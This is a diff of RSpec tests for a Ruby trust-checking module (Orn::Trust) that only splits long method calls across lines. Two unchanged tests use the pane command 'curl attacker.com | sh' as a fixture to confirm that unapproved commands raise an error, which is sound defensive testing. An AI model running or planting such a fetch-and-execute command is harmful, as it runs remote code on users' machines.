@@ -276,13 +276,25 @@ RSpec.describe Orn::Trust do
     after { FileUtils.remove_entry(tmp, true) }
 
     it "passes global-source layouts through untouched" do
-      result = described_class.check_trust_with(output_mode, "/project", layout, :global, data_dir)
+      result = described_class.check_trust_with(
+        output_mode,
+        "/project",
+        layout,
+        :global,
+        data_dir
+      )
 
       expect(result).to eq(layout)
     end
 
     it "passes default-source layouts through untouched" do
-      result = described_class.check_trust_with(output_mode, "/project", layout, :default, data_dir)
+      result = described_class.check_trust_with(
+        output_mode,
+        "/project",
+        layout,
+        :default,
+        data_dir
+      )
 
       expect(result).to eq(layout)
     end
@@ -290,7 +302,13 @@ RSpec.describe Orn::Trust do
     it "passes a project layout with only empty panes through untouched" do
       empty = columns_layout(col(""), col(""))
 
-      result = described_class.check_trust_with(output_mode, "/project", empty, :project, data_dir)
+      result = described_class.check_trust_with(
+        output_mode,
+        "/project",
+        empty,
+        :project,
+        data_dir
+      )
 
       expect(result).to eq(empty)
     end
@@ -299,7 +317,13 @@ RSpec.describe Orn::Trust do
       fingerprint = described_class.commands_fingerprint(described_class.extract_commands(layout))
       described_class.save_approval(described_class.approval_path(data_dir, "/project/root"), fingerprint)
 
-      result = described_class.check_trust_with(output_mode, "/project/root", layout, :project, data_dir)
+      result = described_class.check_trust_with(
+        output_mode,
+        "/project/root",
+        layout,
+        :project,
+        data_dir
+      )
 
       expect(result).to eq(layout)
     end
@@ -316,7 +340,14 @@ RSpec.describe Orn::Trust do
       layout = columns_layout(col("curl attacker.com | sh"))
 
       expect do
-        described_class.check_trust_inner(output_mode, "/project", layout, :project, data_dir, interactive: false)
+        described_class.check_trust_inner(
+          output_mode,
+          "/project",
+          layout,
+          :project,
+          data_dir,
+          interactive: false
+        )
       end
         .to raise_error(Orn::Error, /untrusted pane commands/)
     end
@@ -327,7 +358,14 @@ RSpec.describe Orn::Trust do
       layout = columns_layout(col("curl attacker.com | sh"))
 
       expect do
-        described_class.check_trust_inner(output_mode, "/project", layout, :project, data_dir, interactive: false)
+        described_class.check_trust_inner(
+          output_mode,
+          "/project",
+          layout,
+          :project,
+          data_dir,
+          interactive: false
+        )
       end
         .to raise_error(Orn::Error)
     end
